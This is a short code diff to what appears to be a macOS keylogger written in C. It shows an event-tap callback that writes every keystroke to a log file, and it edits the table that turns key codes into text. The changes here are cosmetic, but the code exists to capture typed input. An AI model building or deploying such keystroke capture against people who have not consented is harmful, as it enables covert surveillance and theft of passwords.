@@ -64,6 +64,7 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     fprintf(logfile, "%s", convertKeyCode(keyCode));
     fflush(logfile);
 
+
     return event;
 }
 
@@ -118,14 +119,14 @@ const char *convertKeyCode(int keyCode) {
         case 46:  return "m";
         case 47:  return ".";
         case 50:  return "`";
-        case 65:  return "[decimal]";
-        case 67:  return "[asterisk]";
-        case 69:  return "[plus]";
+        case 65:  return ".";
+        case 67:  return "*";
+        case 69:  return "+";
         case 71:  return "[clear]";
         case 75:  return "[divide]";
-        case 76:  return "[enter]";
-        case 78:  return "[hyphen]";
-        case 81:  return "[equals]";
+        case 76:  return "[enter]\n";
+        case 78:  return "-";
+        case 81:  return "=";
         case 82:  return "0";
         case 83:  return "1";
         case 84:  return "2";
@@ -136,8 +137,8 @@ const char *convertKeyCode(int keyCode) {
         case 89:  return "7";
         case 91:  return "8";
         case 92:  return "9";
-        case 36:  return "[return]";
-        case 48:  return "[tab]";
+        case 36:  return "[return]\n";
+        case 48:  return "[tab]\t";
         case 49:  return " ";
         case 51:  return "[del]";
         case 53:  return "[esc]";
